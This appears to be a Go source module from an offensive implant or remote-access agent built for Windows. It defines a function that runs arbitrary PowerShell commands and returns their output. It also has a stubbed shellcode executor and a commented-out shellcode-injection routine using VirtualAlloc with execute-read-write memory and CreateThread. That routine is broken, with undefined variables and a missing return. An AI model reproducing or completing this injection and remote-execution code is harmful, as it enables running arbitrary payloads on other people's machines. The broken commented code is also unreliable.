//go:build windows && !debug

package modules

import (
	"errors"
	"os/exec"
)

// TODO
func ShellcodeExec(shellcode []byte) error {
	return errors.New("Not yet implemented for this platform")
}

// Executes a command in Powershell and returns stdout
func Exec(cmd string) ([]byte, error) {
	command := exec.Command("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", cmd)
	byteOut, err := command.CombinedOutput()
	if err != nil {
		return nil, err
	}
	return byteOut, nil
}

/*
import(
	"syscall",
	"unsafe"
)

func ShellcodeExec(shellcode []byte) error {
	var bg_run uintptr = 0x00
	if (bg) {
		bg_run = 0x00000004
	}
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	VirtualAlloc := kernel32.MustFindProc("VirtualAlloc")
	procCreateThread := kernel32.MustFindProc("CreateThread")
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sc)), 0x2000|0x1000, syscall.PAGE_EXECUTE_READWRITE)
	ptr := (*[990000]byte)(unsafe.Pointer(addr))
	for i, value := range sc {
		ptr[i] = value
	}
	procCreateThread.Call(0, 0, addr, 0, bg_run, 0)
}
*/
